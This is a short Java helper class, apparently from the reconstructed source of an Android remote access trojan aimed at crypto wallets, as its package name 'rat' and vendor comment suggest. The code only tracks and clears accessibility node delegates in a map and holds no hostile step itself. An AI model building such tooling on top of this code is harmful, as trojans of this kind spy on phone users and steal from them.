package com.vendor.rat.helper;

import android.util.Log;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.ConcurrentLinkedQueue;

/**
 * Vendor: com.guard.wallet.helper.d
 * Manages delegate node cleanup - tracks and releases accessibility node delegates.
 */
public abstract class DelegateNodeManager {

    public static final ConcurrentHashMap<String, ConcurrentLinkedQueue> delegateMap = new ConcurrentHashMap<>();

    public static void clearAll() {
        try {
            ConcurrentHashMap<String, ConcurrentLinkedQueue> map = delegateMap;
            if (map.isEmpty()) {
                return;
            }
            map.keySet().forEach(new DelegateNodeConsumer());
            map.clear();
        } catch (Exception e) {
            Log.e("DelegateNodeManager", "clearAll error", e);
        }
    }

    public static void release(String key) {
        try {
            if (key == null || key.isEmpty()) {
                return;
            }
            ConcurrentHashMap<String, ConcurrentLinkedQueue> map = delegateMap;
            ConcurrentLinkedQueue queue = map.get(key);
            if (queue != null && !queue.isEmpty()) {
                Log.d("DelegateNodeManager", "归还委托节点:" + key);
                queue.removeIf(new TaskPredicate(0));
                queue.clear();
            }
            map.remove(key);
        } catch (Exception e) {
            Log.e("DelegateNodeManager", "release error", e);
        }
    }
}
